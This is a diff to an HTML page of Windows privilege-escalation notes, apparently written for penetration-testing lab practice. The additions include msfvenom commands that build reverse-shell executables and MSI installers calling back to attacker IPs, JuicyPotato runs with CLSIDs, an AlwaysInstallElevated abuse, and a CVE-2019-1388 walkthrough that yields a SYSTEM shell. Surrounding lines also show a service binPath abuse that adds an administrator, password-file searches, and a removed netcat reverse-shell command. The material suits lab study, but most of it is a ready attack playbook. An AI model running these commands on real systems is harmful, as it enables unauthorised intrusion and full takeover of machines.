@@ -64,7 +64,27 @@ Invoke-AllChecks</code></pre>
                         <pre><code class="language-powershell">sc query windefend #Shows if windows defender is running</code></pre>
                         <pre><code class="language-powershell">Get-LAPSComputers  #Shows which computers use LAPS</code></pre>
                         <pre><code class="language-powershell">tasklist /svc  #Show processes. It may help us to find a CVE for a specific software running in the host</code></pre>
+                        <pre><code class="language-powershell">gci C:\ -Recurse -Directory -ea 0 | % { $p="$($_.FullName)\t.txt"; try { ni $p -ItemType File -ea Stop | Out-Null; ri $p -Force; "[+] $($_.FullName)" } catch {} } #Show writeable folders</code></pre>
                         
+
+                    </ul>
+
+                    <h2 id="Checking Hot-Fixes">Checking Hot-Fixes</h2>
+                    <ul>
+                        <p>There are several tools which can be used to extract the list of KBs and check the results in look for vulnerabilties the we can exploit to escalate privileges</p>
+                        <h3>Sherock</h3>
+                        <ul>
+                            <p>This method can be performed from inside the target machine. Download <a class="notion-link" href="https://github.com/rasta-mouse/Sherlock">here</a></p>
+                            <pre><code class="language-powershell">Import-Module .\Sherlock.ps1
+Find-AllVulns</code></pre>
+                            
+                            
+                        </ul>
+
+                        <h3>Windows exploit suggester</h3>
+                        <ul>
+
+                        </ul>
                     </ul>
                 
                     <h2 id="Enum security controls">Enum security controls</h2>
@@ -147,7 +167,7 @@ set LPORT 9999</code></pre>
                                 <div class="button" onclick="toggleDiv()">Show content</div>
                                 <div id="foldedDiv" class="content">
                                     <p>Download <a class="notion-link" href="https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip">nc.exe</a> and <a class="notion-link" href="https://github.com/antonioCoco/RoguePotato/releases/tag/1.0">RoguePotato.exe</a></p>
-                                    <p>Transfer both files using certutil or others. You can leave them inside any user home you can write or C:\Windows\Temp. Then run</p>
+                                    <p>Transfer both files using certutil or others. You can leave them inside any user home you can write or C:\Windows\Temp.</p>
                                     <p>In your attacker machine open two terminals. One with netcat</p>
                                     <pre><code class="language-powershell">nc -lvnp 3001</code></pre>
                                     <p>And another one with socat to redirect the connection</p>
@@ -173,13 +193,14 @@ set LPORT 9999</code></pre>
                                 <p>If you would like to perform manually the process here are the steps</p>
                                 <div class="button" onclick="toggleDiv()">Show content</div>
                                 <div id="foldedDiv" class="content">
-                                    <p>Download <a class="notion-link" href="https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip">nc.exe</a> and <a class="notion-link" href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">JuicyPotato.exe</a></p>
-                                    <p>Transfer both files using certutil or others. You can leave them inside any user home you can write or C:\Windows\Temp. Then run</p>
-                                    <p>Open a netcat listener</p>
-                                    <pre><code class="language-powershell">nc -lvnp 8443</code></pre>
-                                    <p>And then execute the following in the target machine</p>
-                                    <b>Have in mind that -l parameter it is used to specify an open RPC port which will be used for the exploitation. In case that port isn't open just perform an nmap in look for open RPC ports. Normally high number ports</b>
-                                    <pre><code class="language-powershell">c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *</code></pre>
+                                    <p>Download <a class="notion-link" href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">JuicyPotato.exe</a></p>
+                                    <p>Transfer the file using certutil or others. You can leave them inside any user home you can write or C:\Windows\Temp.</p>
+                                    <p>Generate a malicious .exe file with msfvenom since it will make it things easier</p>
+                                    <pre><code class="language-powershell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.124 LPORT=9999 -f exe -o shell.exe</code></pre>
+                                    <p>Transfer it to the target machine and Execute JuiciyPotato...</p>
+                                    <pre><code class="language-powershell">.\JucicyPotato.exe -l 53375 -p C:\users\public\shell.exe -t *</code></pre>
+                                    <p>In case you are not able to stablish a reverse shell we can use the following script in order to get all CLSID of the target and then try one by one. <a class="notion-link" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2016_Standard/CLSID.list">Get script</a> This script will generate a folder and leave all the CLSID inside</p>
+                                    <pre><code class="language-powershell">.\JucicyPotato.exe -l 53375 -p C:\users\public\shell.exe -t * -c {2C5BC43E-3369-4C33-AB0C-BE9469677AF4}</code></pre>
                                 </div>
 
                                 </ul>    
@@ -457,7 +478,7 @@ reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1</code></p
                     <pre><code class="language-powershell">sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"  #We can add another user in the Administrators group
 sc config AppReadiness binPath= "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\Users\server_adm\Desktop\shell.ps1" #Perform a reverse shell connection</code></pre>
                     </ul>
-                </ul>   
+                </ul>
                 
                 <h2 id="Weak permissions">Weak permissions</h2>
                 <ul>
@@ -626,9 +647,8 @@ findstr /SIM /C:"password" C:\Users\ *.txt *.ini *.cfg *.config *.xml *.git *.ps
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*</code></pre> 
                                     <p>Search file conents powershell methods</p>
-                                    <pre><code class="language-powershell">select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
-dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
-where /R C:\ *.config
+                                    <pre><code class="language-powershell">Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "iamtheadministrator"
+select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
 Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></pre>      
                         </div>
                         
@@ -1060,6 +1080,24 @@ $lnk.Description = "Browsing to the directory where this file is saved will trig
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()</code></pre>
                         </ul>
+                    </ul>
+
+                    <h2 id="Always Install elevated">Always Install elevated</h2>
+                    <ul>
+                    <p>This setting can be set via Local Group Policy by setting and allows that always every installed msi or exe will be installed as SYSTEM user. We can check it performing</p>
+                    <pre><code class="language-bash">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></pre>
+                    <p>In that case this is enabled we could generate a malicious msi and then excute it in order to capture a reverse shell</p>
+                    <pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi</code></pre>
+                    <p>Execute it</p>
+                    <pre><code class="language-bash">msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart</code></pre>
+                    </ul>
+
+                    <h2 id="CVE-2019-1388">CVE-2019-1388</h2>
+                    <ul>
+                        <p>Privilege escalation vulnerability in the windows certificate dialog which did not properly enforce user privileges. In order to trigger it download the <a class="notion-link" href="https://packetstorm.news/files/id/14437/">hhupd.exe</a></p>
+                        <p>Place it in the victim machine and execute it. It will now pop up the UAC windows which ask for the Administrator password. The important thing here is to click in <b>Show information about the publisher's certificate</b> if we click then into the value of <b>Issued by</b> it will open a browser which can be used to open a shell as system</p>
+                        <p>Now click <b>ctrl+s</b> in any part of the page and from the file explorer type cmd.exe in the path bar in order to open the cmd.exe as system</p>
                     </ul>
                 </ul>    
                 </div>
